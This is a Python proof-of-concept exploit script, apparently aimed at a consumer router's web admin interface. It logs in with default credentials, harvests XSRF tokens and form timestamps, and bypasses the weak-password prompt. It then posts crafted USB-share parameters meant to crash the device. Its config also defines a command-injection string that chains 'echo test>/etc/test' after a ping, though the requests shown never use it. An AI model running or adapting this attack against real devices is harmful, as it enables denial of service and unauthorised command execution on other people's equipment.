import requests
import requests.utils
import re
import json
import time
import urllib3
from base64 import b64encode
from urllib.parse import urlencode
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

### config ###
username = 'admin'
password = 'password'
device_web_ip = '192.168.1.1'
ping_target = '192.168.1.3'
inject_cmd = 'ping -c 1 ' + ping_target
inject_cmd += ';echo test>/etc/test'
#####


pw_hash = b64encode('{}:{}'.format(username,password).encode()).decode()
probe1_header = {
  'Host': '0.0.0.0:8081', 
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0', 
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
  'Accept-Language': 'en-US,en;q=0.5', 
  'Accept-Encoding': 'gzip, deflate', 
  'Connection': 'keep-alive', 
  'Referer': 'http://0.0.0.0:8081/start.htm', 
  'Upgrade-Insecure-Requests': '1'
  }
probe1_url = 'http://{}/'.format(device_web_ip)
loop = 3
r = None
while loop>0:
  try:
    loop -= 1
    r = requests.get(url=probe1_url,headers=probe1_header,\
      timeout=5,verify=False,allow_redirects=False)
    if r is None or 'XSRF_TOKEN' not in r.cookies:
      print("Login failed.")
      time.sleep((3-loop)*3)
    else:
      break
  except Exception as e:
    print('Login error:{}'.format(e))
if r is None:
  print('Failed login,please check and retry!')
  exit(1)
tmp:dict = requests.utils.dict_from_cookiejar(r.cookies)
for k,v in tmp.items():
  if k=='XSRF_TOKEN':
    csrftoken = '{}={}'.format(k,v)
    break

probe2_url = 'http://{}/genie_secure_password.htm'.format(device_web_ip)
probe_header = {
  'Host': '{}'.format(device_web_ip), 
  'Authorization': 'Basic {}'.format(pw_hash),
  'Upgrade-Insecure-Requests': '1', 
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36', 
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
  'Accept-Encoding': 'gzip, deflate', 
  'Accept-Language': 'en-US,en;q=0.9', 
  'Cookie': '{}'.format(csrftoken), 
  'Connection': 'close'
  }
loop = 3
r = None
while loop>0:
  try:
    loop -= 1
    r = requests.get(url=probe2_url,headers=probe_header,\
      timeout=5,verify=False,allow_redirects=False)
    if r is None or r.status_code!=200 or 'expired' in r.text:
      print('Login timestamp expired.')
      time.sleep((3-loop)*3)
    else:
      break
  except Exception as e:
    print('Login error:{}'.format(e))
if r is None or r.status_code != 200:
  print('Failed login,please check and retry!')
  exit(1)
pat = r'action="(.*?)\?id=(.*?)"'
res = re.findall(pat, r.text)
if len(res) > 0 and len(res[0])==2:
  uri_half = res[0][0]
  timestamp = res[0][1]
else:
  print('Failed get timestamp,please check and retry!')
  exit(1)

header = {
  'Host': '{}'.format(device_web_ip), 
  'Cache-Control': 'max-age=0', 
  'Authorization': 'Basic {}'.format(pw_hash),
  'Upgrade-Insecure-Requests': '1', 
  'Origin': 'http://{}'.format(device_web_ip), 
  'Content-Type': 'application/x-www-form-urlencoded', 
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36', 
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
  'Referer': 'http://{}/genie_secure_password.htm'.format(device_web_ip), 
  'Accept-Encoding': 'gzip, deflate', 
  'Accept-Language': 'en-US,en;q=0.9', 
  'Cookie': '{}'.format(csrftoken), 
  'Connection': 'close'
  }

login_body = 'sysNewPasswd={}&sysConfirmPasswd={}&question1=0&answer1=&question2=0&answer2=&skip=submit&skip_weak_password_change=1&never_remind=0'.format(password,password)
login_url = 'http://{}/secure_password.cgi?id={}'.format(device_web_ip,timestamp)
r = None
try:
  r = requests.post(url=login_url, headers=header, data=login_body, verify=False, timeout=5, allow_redirects=False)
except:
  pass
if r is None or r.status_code!=200 or 'expired' in r.text:
  print('Login failed.')
  exit(1)

probe_url = 'http://{}/USB_adv_add.htm'.format(device_web_ip)
r = requests.get(url=probe_url,headers=probe_header,\
  timeout=5,verify=False,allow_redirects=False)
res = re.findall(pat, r.text)
if len(res) > 0 and len(res[0])==2:
  uri_half = res[0][0]
  timestamp2 = res[0][1]
else:
  print('Failed get timestamp2,please check and retry!')
  exit(1)

param = {
  'buttonHit': 'Apply', 
  'buttonValue': 'Apply', 
  'usb_device': 16777215, 
  'usb_folder': 'U:\\1111\\', 
  'share_name': '', 
  'read_access': 0, 
  'write_access': 0, 
  'mode': 'add', 
  'fromPage': 1, 
  'selectp': 0, 
  'isAllAdminFolder': -1, 
  'no_dlna': '', 
  'ReadMultiUser0': 0, 
  'readAllNoPwdChecked': 'null', 
  'writeAllNoPwdChecked': 'null', 
  'fromGUI': 'fromGUI'
  }

victim_url = 'http://{}/usb_device.cgi?id={}'.format(device_web_ip,timestamp2)
victim_body = urlencode(param, safe='+')
victim_header = header
try:
  r = requests.post(url=victim_url,headers=victim_header,data=victim_body,\
    timeout=5,verify=False,allow_redirects=False)
  print(r.status_code)
except:
  pass
print('Crash! Please check device state!')